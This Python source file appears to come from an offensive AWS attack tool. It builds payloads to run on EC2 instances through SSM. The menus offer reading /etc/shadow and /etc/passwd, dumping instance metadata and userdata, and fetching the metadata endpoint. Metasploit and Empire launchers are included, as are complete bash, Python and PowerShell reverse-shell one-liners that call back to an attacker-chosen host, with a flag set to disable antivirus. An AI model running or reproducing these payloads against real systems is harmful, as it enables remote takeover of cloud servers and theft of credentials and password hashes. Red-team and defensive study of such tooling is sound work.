from clint.textui import prompt

from src.constants.attack_types import AttackType
from src.constants.commands import PRINT_EC2_METADATA_CMD, PRINT_EC2_METADATA_PSH
from src.constants.platforms import PlatformTypes
from src.helpers.metasploit_options import metasploit_installed_options
from src.helpers.print_output import print_color


def shell_script_options(system_name):
    """
    Prompts command options against an EC2 instance, depending on target OS.
    :param system_name: Target instance OS.
    :return: Tuple of payload and action (AWS SSM DocumentName)
    """
    disable_av = False
    payload = ''
    print_color('[*] Choose your payload:')
    if system_name == PlatformTypes.LINUX.value:
        payload_options = [{'selector': '1', 'prompt': 'cat /etc/passwd', 'return': 'cat /etc/passwd'},
                           {'selector': '2', 'prompt': 'cat /ect/shadow', 'return': 'cat /etc/shadow'},
                           {'selector': '3', 'prompt': 'uname -a', 'return': 'uname -a'},
                           {'selector': '4', 'prompt': 'reverse shell to external host', 'return': AttackType.REVERSE_SHELL.value},
                           {'selector': '5', 'prompt': 'whoami', 'return': 'whoami'},
                           {'selector': '6', 'prompt': 'metasploit', 'return': AttackType.MSF.value},
                           {'selector': '7',
                            'prompt': 'print EC2 metadata and userdata (custom init script)',
                            'return': PRINT_EC2_METADATA_CMD},
                           {'selector': '8', 'prompt': 'Visit a URL from inside EC2 instance',
                            'return': AttackType.URL.value}
                           ]
        action = 'AWS-RunShellScript'
    else:
        payload_options = [{'selector': '1', 'prompt': 'ipconfig', 'return': 'ipconfig'},
                           {'selector': '2', 'prompt': 'reverse shell to external host',
                            'return': AttackType.REVERSE_SHELL.value},
                           {'selector': '3', 'prompt': 'whoami', 'return': 'whoami'},
                           {'selector': '4', 'prompt': 'metasploit', 'return': AttackType.MSF.value},
                           {'selector': '5',
                            'prompt': 'print EC2 metadata and userdata (custom init script)',
                            'return': PRINT_EC2_METADATA_PSH},
                           {'selector': '6', 'prompt': 'Visit a URL from inside EC2 instance',
                            'return': AttackType.URL.value}]
        action = 'AWS-RunPowerShellScript'

    option = prompt.options('Payload:', payload_options)

    if option == AttackType.REVERSE_SHELL.value or option == AttackType.MSF.value:
        print_color(
            f'[*] You chose {option} option. First provide your remote IP and port to explore shell options.')
        remote_ip_host = prompt.query(
            'Your remote IP or hostname to connect back to:')
        remote_port = prompt.query("Your remote port number:", default="4444")
        if option == AttackType.REVERSE_SHELL.value:
            payload = reverseshell_options(remote_ip_host, remote_port, system_name)
        elif option == AttackType.MSF.value:
            payload = metasploit_installed_options(remote_ip_host, remote_port, system_name)
        disable_av = True
    elif option == AttackType.URL.value:
        print_color('[*] Choose the URL to visit from inside the EC2 instance:')
        URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")

        if system_name == 'linux':
            payload = "python -c \"import requests; print requests.get('%s').text;\"" % URL
        else:
            payload = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s').Content;" % URL
    return payload, action, disable_av


def reverseshell_options(host: str, port: str, system_name: str) -> str:
    """
    Prompts for reverse shell options against an EC2 instance depending on its OS.
    :param host: The listening server's IP or hostname
    :param port: Port to listen on for shells.
    :param system_name: OS of that target instance.
    :return: Reverse shell payload
    """
    print_color('[*] Choose your reverse shell type:')
    bash_shell = "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
    python_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (
        host, port)
    powershell_shell = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" % (
        host, port)
    if system_name == "linux":
        shell_options = [{'selector': '1', 'prompt': 'Bash reverse shell', 'return': bash_shell},
                         {'selector': '2', 'prompt': 'Python reverse shell',
                          'return': python_shell},
                         {'selector': '3', 'prompt': 'Empire Python Launcher', 'return': 'empirepython'}]
    else:
        shell_options = [{'selector': '1', 'prompt': 'Powershell reverse shell', 'return': powershell_shell},
                         {'selector': '2', 'prompt': 'Empire Powershell Launcher', 'return': 'empirepowershell'}]
    reverseshell = prompt.options('Payload:', shell_options)
    if reverseshell == 'empirepowershell' or reverseshell == 'empirepython':
        print_color('[*] Generate your Empire launcher code in empire and paste it here:')
        reverseshell = input('Paste here:')

    return reverseshell
